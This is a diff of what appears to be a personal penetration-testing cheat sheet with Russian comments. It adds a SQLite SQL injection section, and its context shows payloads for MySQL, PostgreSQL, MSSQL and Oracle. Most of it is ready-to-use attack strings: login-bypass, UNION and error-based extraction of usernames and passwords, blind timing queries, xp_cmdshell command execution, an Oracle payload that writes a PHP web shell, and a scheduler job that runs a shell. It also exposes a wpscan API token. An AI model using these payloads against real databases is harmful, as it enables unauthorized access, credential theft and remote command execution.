@@ -13,6 +13,7 @@ SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, Postg
 SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //
 
 
+========================================================
 ================SQL INJECTION. MySQL 3306
 mysql -u root -p 'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
 	подключение к MySQL, команды: "show databases;", "select table_name from information_schema.tables;"
@@ -78,6 +79,7 @@ wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7
 	сканирование сайта, поиск уязвимостей движка word press (плагины, пользователи, открытые директории)
 
 
+========================================================
 ================SQL INJECTION. PostgreSQL 5432
 psql -U username -h 192.168.50.16 -p 5432 -d dbname
 
@@ -131,6 +133,7 @@ Error-based:
 ' and (select 123 from users where username='administrator' and LENGTH(password)>3)=123 -- //
 
 
+========================================================
 ================SQL INJECTION. MSSQL 1433
 sqlcmd -S 192.168.50.19 -U sa -P password
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
@@ -184,6 +187,7 @@ CREATE TABLE #tmp (output VARCHAR(1000)); INSERT INTO #tmp EXECUTE xp_cmdshell '
 IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay '00:00:05'; DROP TABLE #tmp; 
 
 
+========================================================
 ================SQL INJECTION. Oracle 1521
 sqlplus scott/tiger@192.168.50.19:1521/XE
 sqlplus system/password@192.168.50.19:1521/XE as sysdba
@@ -238,6 +242,62 @@ select utl_file.fclose(file_handle) from dual;                    -- закрыть
 declare f utl_file.file_type; begin f:=utl_file.fopen('/tmp','shell.php','w'); utl_file.put_line(f,'<?php system($_GET["cmd"]); ?>'); utl_file.fclose(f); end; --
 	запись в файл
 select dbms_scheduler.create_job(job_name=>'cmd',job_type=>'executable',job_action=>'/bin/sh -c "whoami > /tmp/out"',enabled=>true) from dual;
+
+
+========================================================
+================SQL INJECTION. SQLite
+sqlite3 database.db
+
+select sqlite_version();                           -- версия
+select sqlite_source_id();                          -- более детальная версия
+select date('now');                                 -- текущая дата
+select time('now');                                 -- текущее время
+select random();                                    -- случайное число
+select last_insert_rowid();                         -- последний вставленный ID
+select count(*) from sqlite_master;                 -- количество объектов
+select name from sqlite_master where type='table';  -- список таблиц
+'foo'||'bar'
+SUBSTR('foobar', 4, 2)
+
+select name from sqlite_master where type='table';        -- все таблицы
+select sql from sqlite_master where type='table';         -- SQL создания таблиц
+select name from sqlite_master where type='index';        -- все индексы
+select name from sqlite_master where type='view';         -- все представления
+select sql from sqlite_master where tbl_name='users';     -- структура таблицы users
+pragma table_info('users');                                -- колонки таблицы users
+
+' and 1=1 --   
+
+Error-based
+' and 1=cast(sqlite_version() as integer) --          -- ошибка если строка не число
+' and 1=cast((select name from sqlite_master limit 1) as integer) --
+
+' order by 5 --                                      -- определить колонки
+' union select null,null,null --                      -- 3 колонки
+' union select 1,2,3 --                               -- выводящиеся позиции
+' union select sqlite_version(),null,null --          -- версия
+' union select name,null from sqlite_master where type='table' --  -- все таблицы
+' union select sql,null from sqlite_master where tbl_name='users' --  -- структура таблицы
+' union select username,password from users --        -- данные из таблицы
+
+Имитация задержки через тяжелые запросы (в SQLite нет функции временной задержки)
+' and (select count(*) from sqlite_master a, sqlite_master b, sqlite_master c)>0 --
+' and (select count(*) from (select 1 union select 2 union select 3) a, (select 1 union select 2) b, (select 1 union select 2) c, (select 1 union select 2) d)>0 --
+' and (select sum(1) from sqlite_master, sqlite_master, sqlite_master)>0 --
+
+Stacked queries (несколько запросов через ;) не поддерживается
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
